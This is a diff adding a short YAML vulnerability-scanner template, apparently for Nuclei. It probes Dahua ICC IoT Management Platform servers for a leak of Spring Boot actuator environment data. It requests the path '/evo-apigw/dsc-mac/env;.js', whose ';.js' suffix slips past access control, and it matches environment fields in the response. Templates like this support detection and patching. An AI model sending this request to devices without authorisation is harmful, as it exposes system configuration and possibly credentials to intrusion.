@@ -1,0 +1,24 @@
+id: poc-yaml-dahua-icc-env-sensitive-information-leakage
+info:
+  name: Dahua ICC IoT Management Platform env Sensitive Information Leakage Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/evo-apigw/dsc-mac/env;.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"user.name\":"
+          - "\"os.name\":"
+      - type: word
+        part: header
+        words:
+          - "application/vnd.spring-boot.actuator.v1+json"
